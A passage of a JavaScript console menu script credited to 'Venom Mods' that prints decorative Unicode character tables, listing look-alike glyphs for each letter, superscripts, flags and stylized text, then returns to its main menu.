\n\n\u2190\u2191\u2192\u2193\u219A\u219B\u219C\u219D\u219E\u219F\u21A0\u21A1\u21A2\u21A3\u21A4\u21A5\u21A6\u21A7\u21AB\u21AC\u21AD\u21AE\u21AF\u21B0\u21B1\u21B2\u21B3\u21B4\u21B5\u21B6\u21B7\u21B8\u21B9\u21BA\u21BB\u21BC\u21BD\u21BE\u21BF\u21C0\u21C1\u21C2\u21C3\u21C4\u21C5\n\u21C6\u21C7\u21C8\u21C9\u21CA\u21CB\u21CC\u21CD\u21CE\u21CF\u21D0\u21D1\u21D2\u21D3\u21D4\u21D5\u21D6\u21D7\u21D8\u21D9\u21DA\u21DB\u21DC\u21DD\u21DE\u21DF\u21E0\u21E1\u21E2\u21E3\u21E4\u21E5\u21E6\u21E7\u21E8\u21E9\u21EA\u21EB\u21EC\u21ED\n\u21EE\u21EF\u21F0\u21F1\u21F2\u21F3\u21F4\u21F5\u21F6\u21F7\u21F8\u21F9\u21FA\u21FB\u21FC\u21FD\u21FE\u21FF \u2295 \u2297 \u2299 \u22BF \u2302 \u2320\u2321 \u3008\u3009\n\n\nூ䡤\n\n\n\nA=Δ\uA670 Λ λ Ⱥ \u20B3 ą å ส สั ล α ค ศ Ⴉ \uD83C\uDDE6ศ \u20B3 ﾑΔ a ɑ Ă 厾 λ α Λ ɐ ส丹\u24D0 Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά āλ Д Å ä ล Ẳ Ħ ª ẩ ส Ä ձ Ą ๖ۣۜĄ αสั ά ặ\nम स 禸 丒丸凡 丹入 ﾑ ム Д 开 ໞ Ѧ 月么 ਜ  A\u0489 岚 ๖ۣۜA ꬍꬅ 刄 㞩\n\nB=多 乃 ঔৣ͜͡岌 в \u0E3F ß β ც\u24D1 ხ ɮ β ß \u0E3F Ъ طß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь Ɓ ß \u0E3F Þ 乃 邦 ぶ \u2707 及 в Ⴊ \uD83C\uDDE7 ๖ۣۜB 夃 ଷ ℬ\nゐßѢƀЪЬβϐбБъьわゎらね \u266D ɓ B\u0489 ㄢ \n\nC=\xA2 \u20A1 \u20A2 C ς \u2282 匚 ㄷ ど に 二仁 ɕ ૮ C\u0489 ๖ۣۜC Շ \uD83C\uDDE8 \xA2 岚 ᄃ c̈̈ ɔ ς C \xA2 ς ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\xA2 Ĉ č Č \xA9 ĉ Ć ૮\n\nD=ↁ Đ ɗ đ δ ɖ わ 力 \u2283̸ \u2285໓ \uD83C\uDDE9 \u220C D\u0489 刀 Ɗ\n๖ۣۜD ಖ đ Đ ɖ \u24D3 \u2202 ժÐ \u2202 đ ۜÐ \u20ABÐ \u2202 ð đ ๔ მ ძ ժ ɗ \n\nE=Ɇ \u20AC \u212E \u326B \u2209 \u2208 Ξ Σ ξ Є ๋Є ع ə ɇ є ჲ を\nﾐ ﾓ 三 巨 玄乞 Ｅ它 ೯ ౯ ㄠ モ \uD83C\uDDEA E\u0489 亥 ૯ ๖ۣۜE も ƎƏ Ɛ \u060F ៩ 乇 Є є Σ ε ξ \u24D4 玄 ៩ \u20A4 ჰ პ\u212E\xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯૯ є პ ε Ë ع ﻊ ē \u20AC ξ έ \u212E ë Э ۼ\n\nF=Ғ ƒ Բ下 ﾁ Ϝ Fヂ Ք F 下 \uD83C\uDDEB F\u0489. ๖ۣۜF ｷ \u20A3 ʃ ғ \u24D5 f Ғƒ Բ ๖ۣۜF \u20A3ƒ \u20A3 ﬄ ךּ דּ Ғ ક \n\nG=\u20B2 ǥ Ⴚ Ǥ \u2761 ሬ Ԍ G\u0489 ๖ۣۜG ໔ ໕ ផ \u0BF9\n\uD83C\uDDEC Ĝ Ģ g G̈̈ \u24D6 \u20B2 \u0BF9 ğ G๋ ๔ Ġ ġ ģ ğ๋ ؤ و פĢ \u20A2 ɠ ૬ ǥ\n\nH=Ħ ん ɧ 卄௮ அ ஆ Һ һ н Ҕ ҕ Ң ң Ҥҥ Ӈ ӈ Ԋ ԋ 艹 Ⴌ \u2560\u2563 H み ђ ๖ۣۜH ਮ \uD83C\uDDED ん ħ н ђ அ ჩ ħ \u2560\u2563 ђ સ Њ ௮ Ћ нસ அ ħ ђ н Ћ Њ अ\u2560\u2563\n\nI=\u1364 ɨ \u17DB í \u2223 ழェ エ ｪ ｴ 工讠 辶 เ ቾ \uD83C\uDDEE \u0489 I\u0489 \n๖ۣۜI ⶇⷀ ί Ξ រ ł ιΐ ι \u2551ï Î เ Ī ﭑ Ỉ î Į ĩϊ ΐ ذ ﻐ ɩ ւ ɨ\n\nJ=ʝĲ ｊ Ｊ ʲქ ჟ J ℑ ๖ۣۜJ \uD83C\uDDEFʝ ქ J Ĵ ɾ ე უل נ ਹ Ĵנ ل Ţ ړ ਹ ﻮ ʝ ჟ\n\nK=Ҝ Ҟ Ӄ \u20AD Ҝ 长 ҟ Ҡ ҡ ӄ ҝ \uD83C\uDDF0 Ƙ K ઝ ๖ۣۜK \u20AD Ҝ κ ķ К к ๖ۣۜK ઝ Қ ķ к Ҝ \u20AD К қ ҝ\n\nL=Ł Լ ℓ \u221F ﾚ し ̽ſ ʆ ไ \u20B0 \uD83C\uDDF1よ๊レ 廴 L\u0489 ㄥ ๖ۣۜL โ Ն \u20BA Ł \u20B0 ℓ Լ よ ℓ Ĺ Ł Լ Ľ Ļ Ŀ \u2518\xA3 ไŁ ℓ Ļ ๋\u255DԼ ℒ\n\nM=ℳ ๓ ற м რ ო ɱ \u20A5 Ӎ ボ /V 水 ണ Ӎ M\u0489 爪 ๖ۣۜM\n\uD83C\uDDF2 м ℳ რ ற ო ɱ ๓ ʍ დლм ற /V ๓ ๖ۣۜM Щ๓ ற м \u20A5 რ ო ɱ\n\nN=\u20A6 Ń ņ ரŋИ ภй מ Ň หฑ иη\u2229 ல \u20AA ൯ Ŋ N\u0489 れ ๖ۣۜN ฌ ญ ൮ വശഷസ Л\uD83C\uDDF3и \u20A6 Π \u20AA η ெ வ йи η ŋ ฑ ர И ภ й Ń ņ ή п ห Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6\n\nO=Ѻ θ Θ \u274D \u25EF 〇Ծ\u0489 ゆ \u2205 Ø Ծ Օ ס \u2297 \u20B4 Θ ΦϕФ Ω θ๑ \u0E4F ο ๐ σ ø ѳ Ѻ Ѳ Ө ०\nの \u06DD O 口 ๖ۣۜO 汩 ଠ \uD83C\uDDF4Ø \u0E4F σ ǿ \u2295 Ơ Ф \u20B4 ΘԾ øΩ \u274D ტ ი ბ \u2742 ø σ Ø ૭ Ǿ ö \u2642 ợ Ů Ơ Ō Ծ Θ δ Ǿ Ф Ộ Ö ǿ Ŏ ό Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ \u263B θ Ө ɵ Ҩ \xA4\n\nP=\u2118 \u20B1 ℙ 了 ァ 户 ㄕ 尸 卩卫 ƿ ρ م թ ｱ ק \xB6 や ゃ ア マ ャ ヤ ヹ ｱ P\u0489 ㄗ ๖ۣۜP 尹 \uD83C\uDDF5ρ ק թ þ φÞ \u2560\u255Dקּ թ φ þ քק Þ ρ P๋ \u203D ρ ƿ ք թ ॐ \n\nQ=φ Ҩ ҩ. \uD83C\uDDF6 ϑ Q\u0489 ๖ۣۜQ q ๖ۣۜQǪ ǫ գ ℚ \n\nR=ℛ ℜ Ԅ रै\u20B9 Я 訳 尺 㞍 尻 尺 尼 尽 Ի ʀ ɾ я Я 民 \uD83C\uDDF7 R\u0489 屁 ૨ ๖ۣۜR ฯ ণ 尺 尻 я ℜ Γ я \xAE л Я Ř ř ર ŗ ѓ ל гг ŗ я Я Ŗ\n\nS= ฐ ร ຮ ธ ऽ \u20B7 ֆ ى ک উ ঊ Տ હ ៜ \uD83C\uDDF8 ട\n乌马 写 ㄅ ㄘㄎ 亐令 S\u0489 Ｓ ๖ۣۜS ঙ ຣ ଌ ঊ \u20B7 ន ѕ ร \u20B4 ஜى \xA7 ร ş ئ ટ ک Ŝ š હ Ş ઽ ՏȘ ร ﻜ \xA7 Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ \n\nT=\u2533 \u271E \u3012 Ԏ Ŧ \u20AE \u09F3 ॠ ŧ ჭ \u22A5 匕十 क़ 丁 も デ テ ナ ㄤ ｲ 亻 ট ゼ Ⴀ \n平 亇 T\u0489 す ๖ۣۜT ক ፐ ፓ 弋 字 \uD83C\uDDF9т \u2020 է Ե ｲ Ŧ \u09F3ჯ \u20AE क も ł \u253C \u2020 т Ŧ Ţ Ť ŧ \u3036\u3012ł Ŧ \u2670 Ƭ τ \u2020 \n\nU=น Ü บ ป ย ษ ข μ い ų น บ ป\u222A リ ㄩ凵びひ სυʉ \uD83C\uDDFA Ҵ ચ થ ს U\u0489 む ષ ๖ۣۜU Ⴎ ษ ひ υ ს \u222Aચ µ Ü ü џ ů ย Û û ŭ ن น ષย џ ផ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц\n\nV=\u221A 讠 V\u0489 \u2228 ๖ۣۜV ง \uD83C\uDDFBν\u2207\u221A ૪\u221A ٧ ს\n\nW= \u20A9 ฬ ผ ฝ พ ฟ \u0BF0 ឃ ω \uD83C\uDDFC W\u0489 ખ 山 ๖ۣۜW ຟ Ѡ Ш \u20A9 ωŴ ω ŵ ખ ώ ฬ ฝ พ ฟ ﷲ ਘ\n\nX =\xD7 区\xD7义冈区囟ҳ̸Ҳ̸ҳ\u2718\u2717 χ 乂 X\u0489. メ ๖ۣۜX \uD83C\uDDFDχ Ҳ ҳ \u2716χ Ж ჯ \xD7א ﭏ Ҳ ҳ χ \xD7\n\nY = ƴ \xA5 丫吖 Ɏ Ύ Ⴘ 쏘 γ צ ყ Ⴘ Ⴗ ע γ у Y ﻻ ㄚ Ⴤ ψ Ψ Y\u0489. ๖ۣۜY \u2F2C Ƴ\uD83C\uDDFEу Ψ ყ γμ\xA5 ﻻ ŷ Ў ყ γ ÿ ý ५У ყ ﻻ צּ Ұ \xA5 У ұ ץ\n\nΖั = ʑ Ӡ ӡ ろ る 乙 之 z ƶ ȥ ʒ ʐ ʑ ƺ ʓ Z\u0489 \uD83C\uDDFF z 乙 ζ Հ Ż ž ζ ż Ƶ Հ ƶ ƺ\n\nᵃ ᵇ ᶜ ᵈ ᵉ ᶠ ᵍ ʰ ᶤ ʲ ᵏ ˡ ᵐ ᶰ ᵒ ᵖ ˁ ʳ ˢ ᵗ ᵘ ᵛ ʷ ˣ ʸ ᶻ \n\nᴬ ᴮ \u055F ᴰ ᴱ ˁ ᴳ ᴴ ᴵ ᴶ ᴷ ᴸ ᴹ ᴺ ᴼ ᴾ ᵠ ᴿ \u2075 ᵀ ᵁ ᵛ  ᵂ ᵡ ᵞ ᶻ\n\uD83C\uDDE6\uD83C\uDDE7\uD83C\uDDE8 \uD83C\uDDE9 \uD83C\uDDEA\uD83C\uDDEB\uD83C\uDDEC \uD83C\uDDED \uD83C\uDDEE\uD83C\uDDEF\uD83C\uDDF0\uD83C\uDDF1\uD83C\uDDF2 \uD83C\uDDF3 \uD83C\uDDF4 \uD83C\uDDF5 \uD83C\uDDF6 \uD83C\uDDF7 \uD83C\uDDF8 \uD83C\uDDF9 \uD83C\uDDFA \uD83C\uDDFB\uD83C\uDDFC \uD83C\uDDFD \uD83C\uDDFE \uD83C\uDDFF \u2754\n\n\u2070 \xB9 \xB2 \xB3 \u2074 \u2075 \u2076 \u2077 \u2078 \u2079\n\u2776 \u2777 \u2778 \u2779 \u277A \u277B \u277C \u277D \u277E \u277F \u2780 \u2781 \u2782 \u2783 \u2784 \u2785 \u2786 \u2787 \u2788 \u2789\n\nBy Venom Mods \n\n',
            'pink'
          )
        ),
        await sleep(6000),
        main()
      break
    case 'tabela4':
      console.clear(),
        console.log(
          color(
            '\n\n*ɴᴏᴠᴀ ᴛᴀʙᴇʟᴀ*\n\n\uD83C\uDDF2\uD83C\uDDF3ீ͜ৡৢ͜͡\u200B岚ℕ岚ℝℚひቾ岚\u274Dℱ\u20A1͜͡\u2766\uD83C\uDDF2\uD83C\uDDF3\u200B\n*\u25E2\u2599\u25AC\u25AD\u276E\u2751\u2658⃬\u2762\u2730\u2762\u2658⃬\u2751\u276F\u25AD\u25AC\u259F\u25E3* \n\uD83C\uDDF2\uD83C\uDDF9\u21DD፝፝͜͜͡͡\u20A1㞩ℜ\u20B8\u20A4む ↁ\u060F ℤ\u060F\u2127令፝͜͡\u21DC\n\u21DD፝͜͡亇\uA670ⷀ\u274D\u27B3ↁ\uA670\u274D\u27B3Ł\uA670ⷀ\u20A6Ҝ令፝͜͡\u21DC\n\uD83C\uDDF2\uD83C\uDDF3ீ͜ৡৢ͜͡\u200BΔΔℜΩ\u2127ቾΔ \u274Dℱ\u20A1͜͡\u2766\uD83C\uDDF2\uD83C\uDDF3\u200B\nれ \u20A1 \u20A9 \u20A4 \u20B1 \u20B2 \u20B0 \u20B8 \u20B9 ℐ ℑ ℒ ℊ ℋ ℌ ℍす や \u2F33 ቻ ঊ ֆ \u2118 ℙ ℚ ℜ ℝ \u2123 ℤ ℬ \u20B3 \u20B7㞩ℳ ⅅ ⅆ Ǥ \u20A1ↁ Ҩ む ⷀ \u20A6 み ↁ \u060F 亇 ł \nｷ Ⱥ 多 及 ൬̸ 岌 \u20AE \u200B ℴ \n\u21DD፝፝͜͜͡͡\u20A1㞩ℜ\u20B8\u20A4む ↁ\u060F ℤ\u060F\u2127令፝͜͡\u21DC\nஓீ፝͜͡ৎ\u2765̤\u066Dℳ\uA670ⷀℕℋȺℙ\uA670ℜⷀℕℭℰ\u2726\u0488͜͡\u2765\u20B7Ⱥৎ\u273F\n\nஓீ፝͜͡ৎ\u2765̤\u066Dℳ\uA670㞩ℝⷀ㞩ℕ㞩\u2726\u0488͜͡\u2765\n\nஓீ፝͜͡ৎ\u2765̤\u066D弋៩ ℰメ弋ℛ㞩Ň\u274Dৎ\u273F̤֟\u066D\n\u2661w\nĐΔۜۜ\u20B7 ℱℭℭ\nℕ\u274D弋. \n\nᴍɪɴʜᴀ ᴘʀɪɴᴄᴇsᴀ\n\n\nℭんቾ\u221AΔ\u20B7\u066D\u2776\u2776\u2777\u066DΔй\u274D\u20B7\u066Dⅅﾓ\u066DǤℜΔℕⅅℰℤΔ\nℭℋł\u221AΔ\u20B7\u066D\u2776\u2776\u2777\u066DΔй\u274D\u20B7\u066Dⅅﾓ\u066DǤℜΔℕⅅℰℤΔ\nℭℍł\u2123Δ\u20B7\u066D\u2776\u2776\u2777\u066DΔй\u274D\u20B7\u066Dⅅﾓ\u066DǤℜΔℕⅅℰℤΔ\n\xA0ۣ̤ۜۜÐﾓ\xA0ۣ̤ۜۜℭ\u274D\n\uD83C\uDDEB\uD83C\uDDF7ᴄʜɪᴠᴀs ᴀÑᴏs ᴅᴇ ɢʀᴀɴᴅᴇᴢᴀ \uD83C\uDDEB\uD83C\uDDF7\uD83D\uDD35\u26AA\uD83D\uDD34\uD83D\uDC4C\n๖ۣۜ\u20AC ๖ۣۜ@ ℭቾΔ̸\u20A6ひℛ\u274D\n๖ۣۜᴀ ๖ۣۜʙ ๖ۣۜᴄ ๖ۣۜᴅ ๖ۣۜᴇ ๖ۣۜғ ๖ۣۜɢ ๖ۣۜʜ ๖ۣۜɪ ๖ۣۜᴊ ๖ۣۜᴋ ๖ۣۜʟ ๖ۣۜᴍ ๖ۣۜɴ ๖ۣۜᴏ ๖ۣۜᴘ ๖ۣۜǫ ๖ۣۜʀ ๖ۣۜs ๖ۣۜᴛ ๖ۣۜᴜ ๖ۣۜᴡ ๖ۣۜᴠ ๖ۣۜx ๖ۣۜʏ ๖ۣۜᴢ\nஓீ፝͜͡ৎ\u2765\u066D\u2661ℰひ ℚひℰℛ\u274D ひℳ㞩 \u20A6㞩ℳ\u274Dℛ㞩ⅅ㞩ৎ\u273F̤֟\u066D\u2661\nᴀ\u0488 ʙ\u0488 ᴄᴏᴏᴋ ᴅ\u0488 ᴇ\u0488 ғ\u0488 ɢ\u0488 ʜ\u0488 ɪ\u0488 ᴊ\u0488 ᴋ\u0488 ʟ\u0488 ᴍ\u0488 ɴ\u0488 ᴏ\u0488 ᴘ\u0488 ǫ\u0488 ʀ\u0488 s\u0488 ᴛ\u0488 ᴜ\u0488 ᴠ\u0488 ᴡ\u0488 x\u0488 ʏ\u0488 ᴢ\u0488\n\nᴀ\u0489 ʙ\u0489 ᴄ\u0489 ᴅ\u0489 ᴇ\u0489 ᴄ\u0489 ᴅ\u0489 ᴇ\u0489 ғ\u0489 ɢ\u0489ʜ\u0489 ɪ\u0489 ᴊ\u0489 ᴋ\u0489 ʟ\u0489 ᴍ\u0489 ɴ\u0489 ᴏ\u0489 ᴘ\u0489 ǫ\u0489 ʀ\u0489 s\u0489 ᴛ\u0489 ᴜ\u0489 ᴠ\u0489 ᴡ\u0489 x\u0489 ʏ\u0489 ᴢ\u0489\n\n丹 乃 匚 刀 モ 下 ム 卄 工 Ｊ Ｋ ㄥ 爪 れ 口 ㄗ Ｑ 尺 ち 匕 \u222A \u2228 山 メ ㄚ 乙ᴠ ๖ۣۜÄ ๖ۣۜÖ ๖ۣۜÜ\nஓீ፝͜͡ৎ\u2765̤\u066D\n፝͡ৎ\u271E̤֟\u066D ৎ\u2765̤֟\u066D ৎ̤\u2719֟\u066D ஓீۣ̤֟͜\u066D̤֟ ঔ ፝͡ৎ\u2745̤֟\u066D ፝͡ৎ\u271E̤֟\u066D \u2E0E\u271E\n\u2661 ৎ\u2765̤֟\u066Dۣۜঔৣֳ᷌᷈͜͡\u2740 ్మాై ू ፝͜\u2765 ೈ፝͜͡๖ۣۜ ৎ\u273F̤֟\u066D ೈ፝\n\n\u2726\u0488͜͡ℰℒ ℙⷀ\u20A6ℭℍℰ\u271E̤֟ℳ\u20B3ℜ\u20B3ৡৢ͜͡\u27B3 ீ͜ ๖ۣۜۜ͜͡ீ͜ ೈ፝͜͡ ঔৣ͜͡ ৢۜ͜͡\u271F ঔৣ͜͡ீ͜\u2765͜ঔৣ̤֟\u066D\nᎮᏒᎧ\n\uD83C\uDDF2\uD83C\uDDF3\uA670̨\u20E2\u20E2 \u2694\u2730\uA670\u0C7Dͥၕચͣͣธͫ\u2730\uA670\uD83C\uDDF2\uD83C\uDDF3\uA670\u2068̨͝\u20E2\uD83D\uDD25\n\u2730 \nᎣ Ꭴ Ꭳ Ꭵ \nᎤ Ꭶ Ꭳ Ꭵ Ꭷ Ꭴ Ꭶ Ꭸ Ꭵ Ꭷ Ꭹ Ꭶ Ꭸ \nᎪ Ꭷ Ꭹ Ꭻ Ꭸ Ꭺ Ꭼ Ꭹ Ꭻ Ꭽ Ꭺ Ꭼ Ꭾ \nᎫ Ꭽ Ꭿ Ꭼ Ꭾ Ꮀ Ꭽ Ꭿ Ꮁ Ꭾ Ꮀ Ꮂ Ꭿ \nᎱ Ꮃ Ꮀ Ꮂ Ꮄ Ꮁ Ꮃ Ꮅ Ꮂ Ꮄ Ꮆ Ꮃ Ꮅ \nᎷ Ꮄ Ꮆ Ꮈ Ꮅ Ꮇ Ꮉ Ꮆ Ꮈ Ꮊ Ꮇ Ꮉ Ꮋ \nᎸ Ꮊ Ꮌ Ꮉ Ꮋ Ꮍ Ꮊ Ꮌ Ꮎ Ꮋ Ꮍ Ꮏ Ꮌ \n\n\nᎾ Ꮐ Ꮍ Ꮏ Ꮑ Ꮎ Ꮐ Ꮒ Ꮏ Ꮑ Ꮓ Ꮐ Ꮒ \nᏄ Ꮑ Ꮕ Ꮒ Ꮔ Ꮖ Ꮓ Ꮕ Ꮗ Ꮔ Ꮖ Ꮘ \nᏅ Ꮗ Ꮙ Ꮖ Ꮘ Ꮚ Ꮗ Ꮙ Ꮛ Ꮘ Ꮚ Ꮝ Ꮙ \nᏋ Ꮜ Ꮚ Ꮝ Ꮛ Ꮜ Ꮟ Ꮝ Ꮞ Ꮠ Ꮜ Ꮟ \nᏑ Ꮞ Ꮠ Ꮟ Ꮡ Ꮣ Ꮠ Ꮢ Ꮤ Ꮡ Ꮣ Ꮥ \nᏒ Ꮤ Ꮦ Ꮣ Ꮥ Ꮧ Ꮤ Ꮦ Ꮨ Ꮥ Ꮧ Ꮩ Ꮦ ᴡᴀs \nᏘ Ꮪ Ꮧ Ꮩ Ꮫ Ꮨ Ꮪ Ꮬ Ꮩ Ꮫ Ꮭ Ꮪ Ꮬ \n\nᏞ Ꮫ Ꮭ Ꮯ Ꮬ Ꮮ Ꮰ Ꮭ Ꮯ Ꮱ Ꮮ Ꮰ Ꮲ \nᏟ Ꮱ Ꮳ Ꮰ Ꮲ Ꮴ Ꮱ Ꮳ Ꮵ Ꮲ Ꮴ Ꮶ Ꮳ \nᏥ Ꮷ Ꮴ Ꮶ Ꮸ Ꮵ Ꮷ Ꮹ Ꮶ Ꮸ Ꮺ Ꮷ Ꮹ \nᏫ Ꮸ Ꮺ Ꮼ Ꮹ Ꮻ Ꮽ Ꮺ Ꮼ Ꮾ Ꮻ Ꮽ Ꮿ \nᏬ Ꮾ Ᏸ Ꮽ Ꮿ Ᏹ Ꮾ Ᏸ Ᏺ Ꮿ Ᏹ Ᏻ Ᏸ \nᏲ Ᏹ Ᏺ Ᏻ Ꮳ Ᏼ Ꮯ \n\nᏨ Ꮳ Ꮹ Ꮯ Ꮸ Ᏻ Ꮳ Ꮹ Ꮸ Ᏻ Ꮹ Ᏻ\n\n\u3010 \u3011\u3016 \u3017 \uFE3B \uFE3C \uFE44\uFE43 \u300C \u300D \u300E \u300F [ ] \u3008 \u3009 \u300A \u300B\n\u338E \u338F \u339C \u339D \u339E \u33A1 \u33C4 Ᏻ\u33CE \u33D1 \u33D2 \u33D5 \u33D2 \u33D1 \u338E \u338F \u339C \u339D \u339E \u33A1 \u33C4 \u33CE \u33D5 \u2121 \u2122 \u2120 \xA9\n๖ۣۜᴀ ๖ۣۜʙ ๖ۣۜᴄ ๖ۣۜᴅ ๖ۣۜᴇ ๖ۣۜғ ๖ۣۜɢ ๖ۣۜʜ ๖ۣۜɪ ๖ۣۜᴊ ๖ۣۜᴋ ๖ۣۜʟ ๖ۣۜᴍ ๖ۣۜɴ ๖ۣۜᴏ ๖ۣۜᴘ ๖ۣۜǫ ๖ۣۜʀ ๖ۣۜs ๖ۣۜᴛ ๖ۣۜᴜ ๖ۣۜᴠ ๖ۣۜᴡ ๖ۣۜx ๖ۣۜʏ ๖ۣۜᴢ \n\n\n๖ۣۜÄ ๖ۣۜÖ ๖ۣۜÜ ๖ۣۜ\u20AC ๖ۣۜ@ \n๖ۣۜᴀ ๖ۣۜʙ ๖ۣۜᴄ ๖ۣۜᴅ ๖ۣۜᴇ ๖ۣۜғ ๖ۣۜɢ ๖ۣۜʜ ๖ۣۜɪ ๖ۣۜᴊ ๖ۣۜᴋ ๖ۣۜʟ ๖ۣۜᴍ ๖ۣۜɴ ๖ۣۜᴏ ๖ۣۜᴘ ๖ۣۜǫ ๖ۣۜʀ ๖ۣۜs ๖ۣۜᴛ ๖ۣۜᴜ ๖ۣۜᴡ ๖ۣۜᴠ ๖ۣۜx ๖ۣۜʏ ๖ۣۜᴢ\n\n\n\n\n____________________________________________\n\n\nᴀ=Δ\uA670 Λ λ Ⱥ \u20B3 ą å ส สั ล α ค ศ Ⴉ ศ \u20B3 ﾑΔ ᴀ ɑ Ă 厾 λ α Λ ɐ ส丹\u24D0 Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά āλ Д Å ä ล Ẳ Ħ ª ẩ ส Ä ձ Ą ๖ۣۜĄ αสั ά ặ.\nम स 禸 丒丸凡 丹入 ﾑ ム Д 开 ໞ Ѧ 月么 ਜ ᴀ\u0489 岚 ๖ۣۜᴀ ꬍꬅ 刄 㞩\n\nʙ=多 乃 ঔৣ͜͡岌 в \u0E3F ß β ც\u24D1 ხ ɮ β ß \u0E3F Ъ طß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь Ɓ ß \u0E3F Þ 乃 邦 ぶ \u2707 及 в Ⴊ ๖ۣۜʙ 夃 ଷ\nゐßѢƀЪЬβϐбБъьわゎらね \u266D ɓ ʙ\u0489 ㄢ \n\nᴄ=\xA2 \u20A1 \u20A2 ᴄ ς \u2282 匚 ㄷ ど に 二仁 ɕ ૮ ᴄ\u0489 ๖ۣۜᴄ Շ \xA2 \u20A1 ᄃ ᴄ̈̈ ɔ ς ᴄ \xA2 ς\xA0 ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\xA2 Ĉ č Č \xA9 ĉ Ć ૮\n\nᴅ=ↁ Đ ɗ đ δ ɖ わ 力 \u2283̸ \u2285໓ \u220C ᴅ\u0489 刀 Ɗ\n๖ۣۜᴅ ಖ đ Đ ɖ \u24D3 \u2202 ժÐ \u2202 đ ۜÐ \u20ABÐ \u2202 ð đ ๔ მ ძ ժ ɗ \n\nᴇ=Ɇ \u20AC \u212E \u326B \u2209 \u2208 Ξ Σ ξ Є ๋Є ع ə ɇ є ჲ を\nﾐ ﾓ 三 巨 玄乞 Ｅ它 ೯ ౯ ㄠ モ ᴇ\u0489 亥 ૯ ๖ۣۜᴇ も ƎƏ Ɛ \u060F ៩ 乇 Є є Σ ε ξ \u24D4 玄 ៩ \u20A4 ჰ პ\u212E\xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯૯ є პ ε Ë ع ﻊ ē \u20AC ξ έ \u212E ë Э ۼ\n\nғ=Ғ ƒ Բ下 ﾁ Ϝ ғヂ Ք ғ 下 ғ\u0489. ๖ۣۜғ\xA0 ｷ \u20A3 ʃ ғ \u24D5 ғ Ғƒ Բ ๖ۣۜғ \u20A3ƒ \u20A3 ﬄ ךּ דּ Ғ ક \n\nɢ=\u20B2 ǥ Ⴚ Ǥ \u2761 ሬ Ԍ ɢ\u0489 ๖ۣۜɢ ໔ ໕ ផ \u0BF9\nĜ Ģ ɢ ɢ̈̈ \u24D6 \u20B2 \u0BF9 ğ ɢ๋ ๔ Ġ ġ ģ ğ๋ ؤ و פĢ \u20A2 ɠ ૬ ǥ\n\nʜ=Ħ ん ɧ 卄௮ அ ஆ Һ һ н Ҕ ҕ Ң ң Ҥҥ Ӈ ӈ Ԋ ԋ 艹 Ⴌ \u2560\u2563 ʜ み ђ ๖ۣۜʜ ਮ ん ħ н ђ அ ჩ ħ \u2560\u2563 ђ સ Њ ௮ Ћ нસ அ ħ ђ н Ћ Њ अ\u2560\u2563\n\nɪ=\u1364 ɨ \u17DB í \u2223 ழェ エ ｪ ｴ 工讠 辶 เ ቾ \u0489 ɪ\u0489 \n๖ۣۜɪ ⶇⷀ ί Ξ រ ł ιΐ ι \u2551ï Î เ Ī ﭑ Ỉ î Į ĩϊ ΐ ذ ﻐ ɩ ւ ɨ\n\nᴊ=ʝĲ ｊ Ｊ ʲქ ჟ\xA0 ᴊ ℑ ๖ۣۜᴊ ʝ ქ ᴊ Ĵ ɾ ე უل נ ਹ Ĵנ ل Ţ ړ ਹ ﻮ ʝ ჟ\n\nᴋ=Ҝ Ҟ Ӄ \u20AD Ҝ 长 ҟ Ҡ ҡ ӄ ҝ\xA0 Ƙ ᴋ ઝ ๖ۣۜᴋ \u20AD Ҝ κ ķ К к ๖ۣۜᴋ ઝ Қ ķ к Ҝ \u20AD К қ ҝ\n\nʟ=Ł Լ ℓ \u221F ﾚ し ̽ſ ʆ ไ \u20B0 よ๊レ 廴 ʟ\u0489 ㄥ ๖ۣۜʟ โ Ն \u20BA\xA0 Ł \u20B0 ℓ Լ よ ℓ Ĺ Ł Լ Ľ Ļ Ŀ \u2518\xA3 ไŁ ℓ Ļ ๋\u255DԼ\n\nᴍ=ℳ ๓ ற м რ ო ɱ \u20A5 Ӎ\xA0 ボ /ᴠ 水 ണ Ӎ ᴍ\u0489 爪 ๖ۣۜᴍ\nм ℳ რ ற ო ɱ ๓ ʍ დლм ற /ᴠ ๓ ๖ۣۜ Щ๓ ற м \u20A5 რ ო ɱ\n\nɴ=\u20A6 Ń ņ ரŋИ ภй מ Ň หฑ иη\u2229 ல \u20AA ൯ Ŋ ɴ\u0489 れ ๖ۣۜɴ ฌ ญ ൮ വശഷസ Ли \u20A6 Π \u20AA η ெ வ йи η ŋ ฑ ர И ภ йnngj Ń ņ ή п ห Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6hggff\n\nᴏ=Ѻ θ Θ \u274D \u25EF 〇Ծ\u0489 ゆ \u2205 Ø Ծ Օ ס \u2297 \u20B4 Θ ΦϕФ Ω θ๑ \u0E4F ο ๐ σ ø ѳ Ѻ Ѳ Ө ०\nの \u06DD ᴏ 口 ๖ۣۜᴏ 汩 ଠ Ø \u0E4F σ ǿ \u2295 Ơ Ф \u20B4 ΘԾ øΩ \u274D ტ ი ბ \u2742 ø σ Ø ૭ Ǿ ö \u2642 ợ Ů Ơ Ō Ծ Θ δ Ǿ Ф Ộ Ö ǿ Ŏ ό Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ\u20B9 Я 訳 尺 㞍 マ ャ ヤ ヹ gggｱ ᴘ\u0489 ㄗ ๖ۣۜᴘ 尹 ρ ק թ þ φÞ \u2560\u255Dקּ թ φ þ քק00㞍 尻 尺 尼 尽 Ի ʀ ɾ я Я 民 ʀ\u0489 屁 ૨ ๖ۣۜʀ ฯ ণ 尺 尻 я ℜ Γ я \xAE л Я Ř ř ર ŗ ѓ ל гг.\n\nBy Venom Mods\n\n',
            'pink'
          )
        ),
        await sleep(6000),
        main()
      break
    case 'tabela5':
